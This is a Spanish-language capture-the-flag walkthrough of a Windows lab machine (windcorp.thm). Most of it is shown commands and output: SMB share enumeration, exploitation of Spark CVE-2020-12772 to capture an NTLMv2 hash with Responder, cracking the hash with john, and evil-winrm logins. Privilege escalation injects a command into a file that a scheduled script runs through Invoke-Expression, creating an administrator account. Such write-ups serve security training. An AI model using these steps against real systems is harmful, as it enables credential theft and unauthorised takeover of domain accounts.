    |     </body>
    |     </html>
    |   HTTPOptions: 
    |     HTTP/1.1 200 OK
    |     Date: Thu, 05 Oct 2023 14:37:12 GMT
    |     Allow: GET,HEAD,POST,OPTIONS
    |   JavaRMI, drda, ibm-db2-das, informix: 
    |     HTTP/1.1 400 Illegal character CNTL=0x0
    |     Content-Type: text/html;charset=iso-8859-1
    |     Content-Length: 69
    |     Connection: close
    |     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
    |   SqueezeCenter_CLI: 
    |     HTTP/1.1 400 No URI
    |     Content-Type: text/html;charset=iso-8859-1
    |     Content-Length: 49
    |     Connection: close
    |     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
    |   WMSRequest: 
    |     HTTP/1.1 400 Illegal character CNTL=0x1
    |     Content-Type: text/html;charset=iso-8859-1
    |     Content-Length: 69
    |     Connection: close
    |_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
    
    9091/tcp  open  ssl/xmltec-xmlmail? syn-ack ttl 127
    | ssl-cert: Subject: commonName=fire.windcorp.thm
    | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
    | Issuer: commonName=fire.windcorp.thm
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-05-01T08:39:00
    | Not valid after:  2025-04-30T08:39:00
    | MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
    | SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
    | -----BEGIN CERTIFICATE-----
    | MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
    | AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
    | OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
    | AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
    | /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
    | IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
    | X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
    | DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
    | UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
    | VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
    | HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
    | sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
    | 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
    | II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
    | n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
    | +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
    | v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
    | LucP
    |_-----END CERTIFICATE-----
    | fingerprint-strings: 
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
    |     HTTP/1.1 400 Illegal character CNTL=0x0
    |     Content-Type: text/html;charset=iso-8859-1
    |     Content-Length: 69
    |     Connection: close
    |     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
    |   GetRequest: 
    |     HTTP/1.1 200 OK
    |     Date: Thu, 05 Oct 2023 14:37:24 GMT
    |     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
    |     Content-Type: text/html
    |     Accept-Ranges: bytes
    |     Content-Length: 115
    |     <html>
    |     <head><title></title>
    |     <meta http-equiv="refresh" content="0;URL=index.jsp">
    |     </head>
    |     <body>
    |     </body>
    |     </html>
    |   HTTPOptions: 
    |     HTTP/1.1 200 OK
    |     Date: Thu, 05 Oct 2023 14:37:24 GMT
    |     Allow: GET,HEAD,POST,OPTIONS
    |   Help: 
    |     HTTP/1.1 400 No URI
    |     Content-Type: text/html;charset=iso-8859-1
    |     Content-Length: 49
    |     Connection: close
    |     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
    |   RPCCheck: 
    |     HTTP/1.1 400 Illegal character OTEXT=0x80
    |     Content-Type: text/html;charset=iso-8859-1
    |     Content-Length: 71
    |     Connection: close
    |     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
    |   RTSPRequest: 
    |     HTTP/1.1 400 Unknown Version
    |     Content-Type: text/html;charset=iso-8859-1
    |     Content-Length: 58
    |     Connection: close
    |     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>
    |   SSLSessionReq: 
    |     HTTP/1.1 400 Illegal character CNTL=0x16
    |     Content-Type: text/html;charset=iso-8859-1
    |     Content-Length: 70
    |     Connection: close
    |_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
    9389/tcp  open  mc-nmf              syn-ack ttl 127 .NET Message Framing
    49668/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
    49669/tcp open  ncacn_http          syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
    49672/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
    49673/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
    49695/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
    49927/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
    
## Analizamos la informacion obtenida sobre los puertos

- Puerto 80

  -Nos muestra una web la cual contiene un boton con el titulo mas llamativo del mundo 'Reset password', este nos intenta redirecionar a un subdominio.

  ![image](https://github.com/Esevka/CTF/assets/139042999/af496387-6903-4c28-af37-400d21bf2e11)

  Editamos fichero hosts, anadimos el subdominio y dominio.

      ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
      └─# cat /etc/hosts
      10.10.36.177    windcorp.thm fire.windcorp.thm

  Entramos de nuevo en la web y como vemos ya nos redirecciona correctamente.

  ![image](https://github.com/Esevka/CTF/assets/139042999/5a3b57e4-2260-4fea-9b43-11417640b75a)


  -Segun esto si tenemos un usuario y la respuesta a una de las preguntas podemos hacer un reset de la pass del usuario

  Con un simple vistazo en la web encontramos muchos posibles nombres de usuarios.

  ![image](https://github.com/Esevka/CTF/assets/139042999/54da1e33-0d49-4ea9-b794-7650f2fc59f9)
  ![image](https://github.com/Esevka/CTF/assets/139042999/75375432-26ff-4be8-b201-28093f8fb86d)

  -Tras analizar el codigo de la web y buscar y buscar vemos lo siguiente.

    ![image](https://github.com/Esevka/CTF/assets/139042999/dd84811b-4c7e-49e8-a9c2-08ff20ba5843)

      <img class="img-fluid rounded-circle mb-3" src="img/lilyleAndSparky.jpg" alt="">

    Una de las preguntas para hacer el reset de la pass es algo como ---> Como se llama tu mascota preferia?

    ![image](https://github.com/Esevka/CTF/assets/139042999/290ce1af-b2c7-4ade-afca-bfa351f97f11)

    Acabamos de conseguir hacer un reset de la pass del usuario lilyle y obtener unas credenciales.

    ![image](https://github.com/Esevka/CTF/assets/139042999/573ebce3-715f-4baf-b036-a2856814589b)


- Puerto 445 SMB

  -Como vemos tenemos credenciales validads y tenemos acceso a varias carpetas del sistema.

      ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
      └─# crackmapexec smb  windcorp.thm -u lilyle -p ---pass-- --shares                    
      SMB         windcorp.thm    445    FIRE             [*] Windows 10.0 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
      SMB         windcorp.thm    445    FIRE             [+] windcorp.thm\lilyle:---pass---
      SMB         windcorp.thm    445    FIRE             [+] Enumerated shares
      SMB         windcorp.thm    445    FIRE             Share           Permissions     Remark
      SMB         windcorp.thm    445    FIRE             -----           -----------     ------
      SMB         windcorp.thm    445    FIRE             ADMIN$                          Remote Admin
      SMB         windcorp.thm    445    FIRE             C$                              Default share
      SMB         windcorp.thm    445    FIRE             IPC$            READ            Remote IPC
      SMB         windcorp.thm    445    FIRE             NETLOGON        READ            Logon server share 
      SMB         windcorp.thm    445    FIRE             Shared          READ            
      SMB         windcorp.thm    445    FIRE             SYSVOL          READ            Logon server share 
      SMB         windcorp.thm    445    FIRE             Users           READ

  -Listamos la carpeta Shared

      ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
      └─# smbclient //windcorp.thm/Shared -U lilyle   
      Password for [WORKGROUP\lilyle]:
      Try "help" to get a list of possible commands.
      smb: \> dir
        .                                   D        0  Sat May 30 02:45:42 2020
        ..                                  D        0  Sat May 30 02:45:42 2020
        Flag 1.txt                          A       45  Fri May  1 17:32:36 2020
        spark_2_8_3.deb                     A 29526628  Sat May 30 02:45:01 2020
        spark_2_8_3.dmg                     A 99555201  Sun May  3 13:06:58 2020
        spark_2_8_3.exe                     A 78765568  Sun May  3 13:05:56 2020
        spark_2_8_3.tar.gz                  A 123216290  Sun May  3 13:07:24 2020

        15587583 blocks of size 4096. 10914152 blocks available

  -Ya tendriamos la Flag1

      smb: \> get "Flag 1.txt"
      getting file \Flag 1.txt of size 45 as Flag 1.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)


## Explotacion del sistema mediante cliente Spark 2.8.3

-Como vemos en la carpeta Shared encontramos tambien varios instaladores de Spark 2.8.3, ni idea que es Spark, por el momento.

INFO:
  
    Spark es un cliente Jabber/XMPP escrito en Java de Código abierto. 
    Spark es un cliente para Mensajería Instantánea, multiplataforma optimizado para empresas y organizaciones. 

    Extensible Messaging and Presence Protocol, más conocido como XMPP (Protocolo extensible de mensajería y comunicación de presencia),
    anteriormente llamado Jabber,1​ es un protocolo abierto y extensible basado en XML, originalmente ideado para mensajería instantánea. 


-Si no recuerdo mal en el log de NMAP vi algo sobre Jabber/XMPP.
  
    5263/tcp  open  ssl/jabber          syn-ack ttl 127 Ignite Realtime Openfire Jabber server 3.10.0 or later

Intente explotar esta vulnerabilidad pero no tuve exito, eso si aprendi bastante es lo importante.

Path traversal to RCE — Openfire — CVE-2023–32315 --> https://learningsomecti.medium.com/path-traversal-to-rce-openfire-cve-2023-32315-6a8bf0285fcc


-Continue buscando informacion sobre el cliente Spark 2.8.3

Encontre un exploit que nos permite obtener el hash NTLM del usuario con el que mantenemos el chat, pudiendo ganar acceso a la cuenta de este.
Explicacion del exploit ---> https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md

1) Nos descargamos el cliente Spark del recurso compartido

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
        └─# smbclient //windcorp.thm/Shared -U lilyle 
        Password for [WORKGROUP\lilyle]:
        Try "help" to get a list of possible commands.
        smb: \> dir
          .                                   D        0  Sat May 30 02:45:42 2020
          ..                                  D        0  Sat May 30 02:45:42 2020
          Flag 1.txt                          A       45  Fri May  1 17:32:36 2020
          spark_2_8_3.deb                     A 29526628  Sat May 30 02:45:01 2020
          spark_2_8_3.dmg                     A 99555201  Sun May  3 13:06:58 2020
          spark_2_8_3.exe                     A 78765568  Sun May  3 13:05:56 2020
          spark_2_8_3.tar.gz                  A 123216290  Sun May  3 13:07:24 2020
        
                        15587583 blocks of size 4096. 10891127 blocks available
        smb: \> get spark_2_8_3.deb 
        getting file \spark_2_8_3.deb of size 29526628 as spark_2_8_3.deb (1791.2 KiloBytes/sec) (average 1791.2 KiloBytes/sec)
   
2) Instalamos el cliente Spark en nuestra maquina y hacemos login.

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
        └─# dpkg --force-all -i spark_2_8_3.deb
   
    -Iniciamos el cliente Spark

    ![image](https://github.com/Esevka/CTF/assets/139042999/cf8aa688-d587-435c-98d4-7211d76737cc)

    -En la configuracion del cliente Spark debemos marcar estas dos opciones, de lo contrario nos dara error y no podremos iniciar sesion.

    ![image](https://github.com/Esevka/CTF/assets/139042999/cf27b429-150c-4679-8701-3d99fdefabfc)

    ![image](https://github.com/Esevka/CTF/assets/139042999/efc56c8e-6280-4f08-8464-ba54425a46a0)

3) Obtenemos direcciones a las que poder enviar el exploit

   -Si recordamos en la web hay una lista direcciones del equipo tecnico
   
    ![image](https://github.com/Esevka/CTF/assets/139042999/4e8b95a5-6e85-4646-a978-1f4f927a2f32)

   -Copiamos el codigo web con los correos en un fichero y otenemos todas las direcciones
                                                                                                                                                                                                
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
        └─# grep -oP 'xmpp:(\w+\W)+' it_correos | sed 's/xmpp://g' | sed 's/"//g'
        organicfish718@fire.windcorp.thm
        organicwolf509@fire.windcorp.thm
        tinywolf424@fire.windcorp.thm
        angrybird253@fire.windcorp.thm
        buse@fire.windcorp.thm
        Edeltraut@fire.windcorp.thm
        Edward@fire.windcorp.thm
        Emile@fire.windcorp.thm
        tinygoose102@fire.windcorp.thm
        brownostrich284@fire.windcorp.thm
        sadswan869@fire.windcorp.thm
        sadswan869@fire.windcorp.thm
        whiteleopard529@fire.windcorp.thm
        happymeercat399@fire.windcorp.thm
        orangegorilla428@fire.windcorp.thm

4) Obtenemos el Hash NTLM de algun usuario de la lista.

   -Creamos un grupo donde anadiremos todos las cuentas de openfire de los usuarios
   
   ![image](https://github.com/Esevka/CTF/assets/139042999/8d1e063e-3faf-47ba-a0de-91265f544eeb)

   ![image](https://github.com/Esevka/CTF/assets/139042999/bfc54ac6-26d8-41ec-9651-42bbc5cd8fbe)

  -Ejecutamos el exploit

  ![image](https://github.com/Esevka/CTF/assets/139042999/7dc719bb-430b-4bb3-9f2d-43d401063384)

  Como vemos mediante responder acabamos de obtener el Hash NTLMV2 del usuario ---> WINDCORP\buse

    [HTTP] NTLMv2 Client   : 10.10.8.220
    [HTTP] NTLMv2 Username : WINDCORP\buse
    [HTTP] NTLMv2 Hash     : buse::WINDCORP:17bdc88837e1a3f6:252BE1A9FD74D654D03FB0BE43C29ABF:01010000000000007A200E8AE1F8D901D6714F65543A7D670000000002000800420051005200560001001E00570049004E002D004B004F0055004B0030005900330056004300370042000400140042005100520056002E004C004F00430041004C0003003400570049004E002D004B004F0055004B0030005900330056004300370042002E0042005100520056002E004C004F00430041004C000500140042005100520056002E004C004F00430041004C0008003000300000000000000001000000002000006DC166A2AEAC9526CC257F8662B825B98F1B92ED3AB6CD597DABF0C6106F2F030A00100000000000000000000000000000000000090000000000000000000000      
    [*] Skipping previously captured hash for WINDCORP\buse

 ## Autenticacion en la maquina victima mediante evil-WinRm

  -Hemos obtenido un Hash NTLMv2 por lo que necesitamos crakearlo (creo recordar que evil-Winrm solo soporta NTLMv1)

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
    └─# cat hash_ntlmv2                                                            
    buse::WINDCORP:17bdc88837e1a3f6:252BE1A9FD74D654D03FB0BE43C29ABF:01010000000000007A200E8AE1F8D901D6714F65543A7D670000000002000800420051005200560001001E00570049004E002D004B004F0055004B0030005900330056004300370042000400140042005100520056002E004C004F00430041004C0003003400570049004E002D004B004F0055004B0030005900330056004300370042002E0042005100520056002E004C004F00430041004C000500140042005100520056002E004C004F00430041004C0008003000300000000000000001000000002000006DC166A2AEAC9526CC257F8662B825B98F1B92ED3AB6CD597DABF0C6106F2F030A00100000000000000000000000000000000000090000000000000000000000

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
    └─# john hash_ntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt 
    Using default input encoding: UTF-8
    Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
    Will run 3 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    uzun-----131      (buse)     
    1g 0:00:00:01 DONE (2023-10-07 08:06) 0.7092g/s 2099Kp/s 2099Kc/s 2099KC/s v%k2fifa..uwejoma
    Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
    Session completed. 

  -Obtenemos sesion en la maquina victima
  
    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
    └─# evil-winrm -i windcorp.thm -u buse -p uz------3131                      
                                            
    Evil-WinRM shell v3.5
                                            
    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                            
    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                            
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\buse\Documents> 
    
  -Leemos Flag 2

    *Evil-WinRM* PS C:\Users\buse\Desktop> type 'Flag 2.txt'
    THM{6f6---------------104ed804ad06c7c9b1}

## Elevacion de privilegios(Postexplotacion del Sistema)

  -Tras listar un rato directorios y buscar informacion encontramos C:\scripts

    *Evil-WinRM* PS C:\scripts> dir

    Directory: C:\scripts

    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    -a----         5/3/2020   5:53 AM           4119 checkservers.ps1
    -a----        10/6/2023  11:26 PM             31 log.txt

   Segun log.txt suponemos que el script checkservers.ps1 se ejecuta a intervalos de tiempo
   
   Analizamos checkservers.ps1 y obtenemos datos importantes.
    
  - Este codigo lee el contenido del fichero hosts.txt que se encuentra en el raiz del usuario brittanycr(el cual no tenemos permisos para poder leer o editar) ejecuta  un cmdlet de PowerShell utilizado para realizar una prueba de ping a un equipo remoto(Test-Connection) pasandole como variable el contenido del fichero hosts.txt a traves del parametro (-ComputerName $_) para especificar el nombre o la dirección IP del equipo.
  
          get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
          ForEach-Object {
              $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
              Invoke-Expression $p
    
    Otra linea importante es esta, segun la info obtenida en internet
  
          Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
          
    INFO: Para enviar correos electrónicos desde PowerShell, es recomendable ejecutar PowerShell con derechos de administrador para asegurarte de tener los permisos necesarios.


  -Necesitamos tener acceso al fichero ---> C:\Users\brittanycr\hosts.txt

  Revisando toda la info del usuario con el que estamos logueados (buse) vemos que pertenecemos al grupo --> BUILTIN\Account Operators

  ![image](https://github.com/Esevka/CTF/assets/139042999/054d5b4f-0b4e-487e-884c-9a0bdf554423)

  INFO: 
  
    El grupo "BUILTIN\Account Operators" tiene como objetivo permitir a los usuarios administrar cuentas de usuario locales en el equipo.
    Esto incluye la capacidad de crear, modificar y eliminar cuentas de usuario locales

  - Vamos a intentar cambiar la clave del usuario --> brittanycr , e intentar loguearnos en el sistema con evil-winrm

        *Evil-WinRM* PS C:\scripts> net user brittanycr NewPass+1234
        The command completed successfully.

    Intentamos hacer login mediante evil-winrm pero no fue exitoso, por lo que necesitamos otro punto de entrada.

  - Lo Intentamos con SMB

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
        └─# crackmapexec smb windcorp.thm -u brittanycr -p NewPass+1234 --shares
        SMB         windcorp.thm    445    FIRE             [*] Windows 10.0 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
        SMB         windcorp.thm    445    FIRE             [+] windcorp.thm\brittanycr:NewPass+1234 
        SMB         windcorp.thm    445    FIRE             [+] Enumerated shares
        SMB         windcorp.thm    445    FIRE             Share           Permissions     Remark
        SMB         windcorp.thm    445    FIRE             -----           -----------     ------
        SMB         windcorp.thm    445    FIRE             ADMIN$                          Remote Admin
        SMB         windcorp.thm    445    FIRE             C$                              Default share
        SMB         windcorp.thm    445    FIRE             IPC$            READ            Remote IPC
        SMB         windcorp.thm    445    FIRE             NETLOGON        READ            Logon server share 
        SMB         windcorp.thm    445    FIRE             Shared          READ            
        SMB         windcorp.thm    445    FIRE             SYSVOL          READ            Logon server share 
        SMB         windcorp.thm    445    FIRE             Users           READ     

    - Nos conectamos a la raiz del usuario brittanycr y hay tenemos nuestro deseado fichero.
    
          ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
          └─# smbclient //windcorp.thm/Users -U brittanycr
          Password for [WORKGROUP\brittanycr]:
          Try "help" to get a list of possible commands.
          smb: \> cd brittanycr
          smb: \brittanycr\> dir
            .                                   D        0  Sun May  3 01:36:46 2020
            ..                                  D        0  Sun May  3 01:36:46 2020
            hosts.txt                           A       22  Sun May  3 15:44:57 2020

    - Proceso para elevar privilegios.

          Crearemos un usuario nuevo en el sistema y le vamos a decir que pertenece al grupo administrators.

    1)  Emulamos el proceso que realizara el script Powershell en nuestra maquina local, vemos que funciona correctamente.
      
          NOTA: En PowerShell, el punto y coma (;) se utiliza como un separador de comandos.

        ![image](https://github.com/Esevka/CTF/assets/139042999/5862d928-c722-4c31-9bbb-614c54b484fc)
        

    2) Descargamos, editamos y subimos el fichero hosts.txt para intentar elevar privilegios.
  
            smb: \brittanycr\> get hosts.txt 
            getting file \brittanycr\hosts.txt of size 22 as hosts.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

       ![image](https://github.com/Esevka/CTF/assets/139042999/786adcba-d915-462e-84ab-299923e8b425)

            smb: \brittanycr\> put hosts.txt hosts.txt
            putting file hosts.txt as \brittanycr\hosts.txt (0.5 kb/s) (average 0.4 kb/s)
       
    
    4) Esperamos un poco a que el sistema ejecute la tarea programada y veremos si nuestro exploit se ha ejecutado correctamente.
       Como vemos estamos logueados como usuario --> buse ; El script se ha ejecutado correctamente y nos ha creado nuestro nuevo usuario EsevKa.
        
            *Evil-WinRM* PS C:\users> whoami
            windcorp\buse
   
       
            *Evil-WinRM* PS C:\users> net user Esevka
            User name                    EsevKa
            Full Name
            Comment
            User's comment
            Country/region code          000 (System Default)
            Account active               Yes
            Account expires              Never
            
            Password last set            10/7/2023 10:42:35 PM
            Password expires             11/18/2023 10:42:35 PM
            Password changeable          10/8/2023 10:42:35 PM
            Password required            Yes
            User may change password     Yes
            
            Workstations allowed         All
            Logon script
            User profile
            Home directory
            Last logon                   Never
            
            Logon hours allowed          All
            
            Local Group Memberships      *Administrators
            Global Group memberships     *Domain Users
            The command completed successfully.

    5) Logueamos como Esevka y obtenemos flag 3.
   
            ┌──(root㉿kali)-[/home/kali]
            └─# evil-winrm -i windcorp.thm -u EsevKa -p NewPass+1234 
                                                    
            Evil-WinRM shell v3.5                                   
            Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                      
            Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                       
            Info: Establishing connection to remote endpoint
             
            *Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
            
                Directory: C:\Users\Administrator\Desktop
            
            Mode                LastWriteTime         Length Name
            ----                -------------         ------ ----
            -a----         5/7/2020   1:22 AM             47 Flag3.txt
            
            *Evil-WinRM* PS C:\Users\Administrator\Desktop> type Flag3.txt
            THM{ba3a2bff2e535--------283890faae54ac2ef}


---
---> Maquina Ra1 completa. <---
---
        



    

    
  
     
    



  
    

  

    
  
